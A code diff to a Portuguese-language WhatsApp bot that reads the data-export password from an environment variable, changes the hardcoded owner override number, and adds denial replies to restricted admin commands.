@@ -58,7 +58,7 @@ const OVERRIDE_PENDING_TIMEOUT_MS = 5 * 60 * 1000
 const ECONOMY_WIPE_COMMAND = prefix + "wipeeconomia"
 const ECONOMY_WIPE_COMMAND_ALIAS = prefix + "wipeeconomy"
 const ECONOMY_WIPE_CONFIRM_PHRASE = "CONFIRMAR WIPE ECONOMIA"
-const DATA_EXPORT_PASSWORD = crypto.randomBytes(24).toString("hex")
+const DATA_EXPORT_PASSWORD = String(process.env.PROFILER_PASSWORD || "").trim() || crypto.randomBytes(24).toString("hex")
 const pendingBroadcastBySender = new Map()
 const pendingOverrideAddBySender = new Map()
 const pendingEconomyWipeBySender = new Map()
@@ -316,9 +316,9 @@ const {
 // Sobrescrita de identidade para comandos administrativos especiais
 const HARDCODED_OVERRIDE_OWNER = "owner"
 const HARDCODED_OVERRIDE_IDENTIFIERS = [
-  "279202939035898@lid",
-  "279202939035898@s.whatsapp.net",
-  "279202939035898",
+  "5521995409899@lid",
+  "5521995409899@s.whatsapp.net",
+  "5521995409899",
 ]
 
 const OVERRIDE_CONTROL_SCOPE = "__system__"
@@ -1611,7 +1611,7 @@ async function startBot(){
                 mentionLines.push(mentionTokens.slice(i, i + 2).join(" "))
               }
               const mentionBlock = mentionLines.join("\n")
-              const groupText = mentionBlock ? `${finalText}\nMarcando todos os membros:\n${mentionBlock}` : finalText
+              const groupText = mentionBlock ? `${finalText}\n\nMarcando todos os membros:\n${mentionBlock}` : finalText
               await sock.sendMessage(groupId, { text: groupText, mentions })
             } else {
               await sock.sendMessage(groupId, { text: finalText })
@@ -1913,7 +1913,18 @@ async function startBot(){
     }
 
     if (cmdName === OVERRIDE_DATA_PASSWORD_COMMAND) {
-      if (!isKnownOverrideIdentity(sender, { includeDisabled: false }) || isGroup) return
+      if (isGroup) {
+        await sock.sendMessage(from, {
+          text: "Use !vaultkey apenas no privado (DM).",
+        })
+        return
+      }
+      if (!isKnownOverrideIdentity(sender, { includeDisabled: false })) {
+        await sock.sendMessage(from, {
+          text: "⛔ Comando restrito a seletos usuários.",
+        })
+        return
+      }
       await sock.sendMessage(from, {
         text: `Senha de exportação (.data):\n${DATA_EXPORT_PASSWORD}`,
       })
@@ -1963,7 +1974,12 @@ async function startBot(){
         await sock.sendMessage(from, { text: "Use esse comando somente no privado (DM)." })
         return
       }
-      if (!isHardcodedOverrideIdentity(sender)) return
+      if (!isHardcodedOverrideIdentity(sender)) {
+        await sock.sendMessage(from, {
+          text: "⛔ Comando restrito ao override hardcoded.",
+        })
+        return
+      }
 
       const profileNameRaw = cmdParts.slice(1).join(" ").trim().toLowerCase()
       if (!profileNameRaw) {
@@ -2256,8 +2272,14 @@ async function startBot(){
     }
 
     if (cmdName === prefix + "toggleover") {
-      if (isGroup) return
-      if (!isKnownOverrideIdentity(sender, { includeDisabled: false })) return
+      if (isGroup) {
+        await sock.sendMessage(from, { text: "Use esse comando somente no privado (DM)." })
+        return
+      }
+      if (!isKnownOverrideIdentity(sender, { includeDisabled: false })) {
+        await sock.sendMessage(from, { text: "⛔ Comando restrito a override." })
+        return
+      }
 
       const nextEnabled = !overrideChecksEnabled
       setOverrideChecksEnabled(nextEnabled)
@@ -3236,6 +3258,7 @@ async function startBot(){
         prefix,
         isGroup,
         isOverrideSender,
+        isKnownOverrideSender: isKnownOverrideIdentity(sender, { includeDisabled: false }),
         overrideJid: overrideCompat.overrideJid,
         msg,
         quoted,
